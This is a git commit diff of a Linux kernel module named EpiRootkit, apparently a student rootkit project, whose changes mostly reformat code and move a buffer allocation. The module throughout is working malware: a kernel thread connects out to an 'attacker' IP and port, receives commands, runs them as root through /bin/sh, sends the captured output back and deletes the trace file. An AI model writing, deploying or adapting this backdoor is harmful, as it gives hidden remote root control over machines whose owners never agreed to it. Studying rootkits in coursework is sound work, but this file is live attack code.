e72bdc5d293e985381f046880a327b29adbe6a63
corentin.dupaigne <declan.lowee@gmail.com>
2025-05-14 21:42:33 +0200

    ewfew

--- rootkit/rootkit/waystar_rootkit.c
+++ rootkit/rootkit/waystar_rootkit.c
@@ -1,3 +1,5 @@
+// rootkit/epirootkit.c
+
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -9,9 +11,9 @@
 #include <linux/socket.h>
 #include <linux/slab.h>
 #include <linux/fs.h>
+#include <linux/namei.h>      // for kern_path()
 #include <linux/uaccess.h>
 #include <linux/moduleparam.h>
-#include <linux/namei.h>      // for kern_path()
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Jules Aubert <jules1.aubert@epita.fr>");
@@ -32,33 +34,34 @@ MODULE_PARM_DESC(attacker_port, "Attacker VM TCP port");
 static struct task_struct *conn_thread;
 static struct socket      *conn_sock;
 
-/* Send all bytes over socket */
-static int sock_send_all(struct socket *sock, const void *buf, size_t len) {
-    struct msghdr msg = {0};
-    struct kvec   iov;
-    iov.iov_base = (void *)buf;
-    iov.iov_len  = len;
+/* Send exactly len bytes */
+static int sock_send_all(struct socket *sock, const void *buf, size_t len)
+{
+    struct msghdr msg = { };
+    struct kvec   iov = { (void *)buf, len };
     return kernel_sendmsg(sock, &msg, &iov, 1, len) < 0 ? -1 : 0;
 }
 
-/* Receive exactly `len` bytes, or error */
-static int sock_recv_all(struct socket *sock, void *buf, size_t len) {
-    struct msghdr msg = {0};
+/* Receive exactly len bytes */
+static int sock_recv_all(struct socket *sock, void *buf, size_t len)
+{
+    struct msghdr msg = { };
     struct kvec   iov;
-    int           ret, received = 0;
-    while (received < len) {
-        iov.iov_base = buf + received;
-        iov.iov_len  = len - received;
+    int           ret, rec = 0;
+
+    while (rec < len) {
+        iov.iov_base = buf + rec;
+        iov.iov_len  = len - rec;
         ret = kernel_recvmsg(sock, &msg, &iov, 1, iov.iov_len, 0);
         if (ret <= 0)
             return ret;
-        received += ret;
+        rec += ret;
     }
-    return received;
+    return rec;
 }
 
-/* Execute `cmd` in userspace, capture stdout/stderr+exit code */
-static int execute_and_capture(const char *cmd) {
+static int execute_and_capture(const char *cmd)
+{
     char          *argv[] = { "/bin/sh", "-c", NULL, NULL };
     char          *envp[] = { "HOME=/", "PATH=/bin:/usr/bin", NULL };
     mm_segment_t   oldfs;
@@ -67,30 +70,35 @@ static int execute_and_capture(const char *cmd) {
     char          *out_buf;
     int            ret;
 
-    /* build: cmd > OUT_FILE 2>&1; echo EXIT=$? >> OUT_FILE */
+    /* build the shell command */
     argv[2] = kmalloc(strlen(cmd) + 128, GFP_KERNEL);
-    if (!argv[2]) return -ENOMEM;
+    if (!argv[2])
+        return -ENOMEM;
     snprintf(argv[2], strlen(cmd) + 128,
              "%s > " OUT_FILE " 2>&1; echo EXIT=$? >> " OUT_FILE,
              cmd);
 
+    /* execute in user space, wait for it */
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
-    /* read and send back */
+    /* read back the output file */
     oldfs = get_fs();
     set_fs(KERNEL_DS);
     f = filp_open(OUT_FILE, O_RDONLY, 0);
     if (!IS_ERR(f)) {
         loff_t size = i_size_read(file_inode(f));
         size_t read_len = min_t(size_t, size, CMD_MAX_LEN);
+
         out_buf = kmalloc(read_len, GFP_KERNEL);
         if (out_buf) {
             vfs_read(f, out_buf, read_len, &pos);
+
             {
                 uint32_t net_len = htonl(read_len);
                 sock_send_all(conn_sock, &net_len, sizeof(net_len));
                 sock_send_all(conn_sock, out_buf, read_len);
             }
+
             kfree(out_buf);
         }
         filp_close(f, NULL);
@@ -98,7 +106,7 @@ static int execute_and_capture(const char *cmd) {
     set_fs(oldfs);
     kfree(argv[2]);
 
-    /* delete temp file */
+    /* delete the temp file via kern_path + vfs_unlink() */
     {
         struct path p;
         if (kern_path(OUT_FILE, LOOKUP_FOLLOW, &p) == 0) {
@@ -106,14 +114,20 @@ static int execute_and_capture(const char *cmd) {
             path_put(&p);
         }
     }
+
     return ret;
 }
 
-/* Thread that maintains connection and processes commands */
-static int connection_worker(void *data) {
+static int connection_worker(void *data)
+{
     struct sockaddr_in addr;
     int               ret;
     char             *cmd;
+
+    /* allocate cmd buffer here to avoid mixed declarations */
+    cmd = kmalloc(CMD_MAX_LEN + 1, GFP_KERNEL);
+    if (!cmd)
+        return -ENOMEM;
 
     while (!kthread_should_stop()) {
         /* create socket */
@@ -122,11 +136,14 @@ static int connection_worker(void *data) {
             pr_err("[EpiRootkit] sock_create failed: %d\n", ret);
             goto retry;
         }
+
+        /* setup address */
         memset(&addr, 0, sizeof(addr));
         addr.sin_family      = AF_INET;
         addr.sin_addr.s_addr = in_aton(attacker_ip);
         addr.sin_port        = htons(attacker_port);
 
+        /* connect */
         ret = kernel_connect(conn_sock,
                              (struct sockaddr *)&addr,
                              sizeof(addr), 0);
@@ -135,36 +152,45 @@ static int connection_worker(void *data) {
             sock_release(conn_sock);
             goto retry;
         }
-        pr_info("[EpiRootkit] Connected to %s:%d\n", attacker_ip, attacker_port);
+        pr_info("[EpiRootkit] Connected to %s:%d\n",
+                attacker_ip, attacker_port);
 
         /* command loop */
         while (!kthread_should_stop()) {
             uint32_t net_len;
-            int      len = sock_recv_all(conn_sock, &net_len, sizeof(net_len));
-            if (len <= 0) break;
-            len = ntohl(net_len);
-            if (len <= 0 || len > CMD_MAX_LEN) break;
-            cmd = kmalloc(len+1, GFP_KERNEL);
-            if (!cmd) break;
-            if (sock_recv_all(conn_sock, cmd, len) <= 0) {
-                kfree(cmd);
+            int      len;
+
+            len = sock_recv_all(conn_sock, &net_len, sizeof(net_len));
+            if (len <= 0)
                 break;
-            }
+
+            len = ntohl(net_len);
+            if (len <= 0 || len > CMD_MAX_LEN)
+                break;
+
+            /* recv the command */
+            if (sock_recv_all(conn_sock, cmd, len) <= 0)
+                break;
             cmd[len] = '\0';
+
             pr_info("[EpiRootkit] Exec: %s\n", cmd);
             execute_and_capture(cmd);
-            kfree(cmd);
         }
+
         sock_release(conn_sock);
     retry:
         ssleep(5);
     }
+
+    kfree(cmd);
     return 0;
 }
 
-static int __init epirootkit_init(void) {
+static int __init epirootkit_init(void)
+{
     pr_info("[EpiRootkit] Initializing...\n");
-    conn_thread = kthread_run(connection_worker, NULL, "epirootkit_conn");
+    conn_thread = kthread_run(connection_worker,
+                              NULL, "epirootkit_conn");
     if (IS_ERR(conn_thread)) {
         pr_err("[EpiRootkit] Thread start failed\n");
         return PTR_ERR(conn_thread);
@@ -173,10 +199,13 @@ static int __init epirootkit_init(void) {
     return 0;
 }
 
-static void __exit epirootkit_exit(void) {
+static void __exit epirootkit_exit(void)
+{
     pr_info("[EpiRootkit] Exiting...\n");
-    if (conn_thread) kthread_stop(conn_thread);
-    if (conn_sock)  sock_release(conn_sock);
+    if (conn_thread)
+        kthread_stop(conn_thread);
+    if (conn_sock)
+        sock_release(conn_sock);
     pr_info("[EpiRootkit] Unloaded.\n");
 }
 
